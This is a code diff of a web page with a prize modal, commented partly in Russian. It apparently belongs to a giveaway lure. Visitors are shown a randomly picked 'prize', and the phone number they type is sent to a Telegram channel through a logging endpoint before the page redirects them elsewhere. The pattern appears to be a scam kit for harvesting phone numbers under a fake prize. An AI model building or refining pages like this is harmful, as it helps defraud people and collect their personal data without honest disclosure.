@@ -238,21 +238,24 @@
       prizeModal.classList.remove('hidden');
       prizeModal.classList.add('flex');
 
-    continueBtn.onclick = () => {
-    const phone = phoneInput.value;  // введённый номер
-    const prize = pickPrize();       // приз
+    continueBtn.onclick = async () => {
+  const phone = phoneInput.value;
+  const prize = pickPrize();
 
-    if(isTg){
-        try {
-            const payload = { phone, prize };
-            window.Telegram.WebApp.sendData(JSON.stringify(payload)); // отправляем данные в бота
-        } catch(err){
-            console.error('Ошибка отправки данных в TG WebApp', err);
-        }
-    }
-        // Then redirect user to your verified domain (outside TG it will open in same tab)
-         window.location.href = REDIRECT_URL;
-      };
+  // отправляем лог на Vercel → Telegram
+  try {
+    await fetch('/api/log', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message: `Номер: ${phone}, Приз: ${prize}` })
+    });
+  } catch(e) {
+    console.error('Ошибка отправки лога', e);
+  }
+
+  // редирект на страницу победы
+  window.location.href = REDIRECT_URL;
+};
     }
 
     function resetUI(){
@@ -296,4 +299,3 @@
 </div> -->
 </body>
 </html>
-
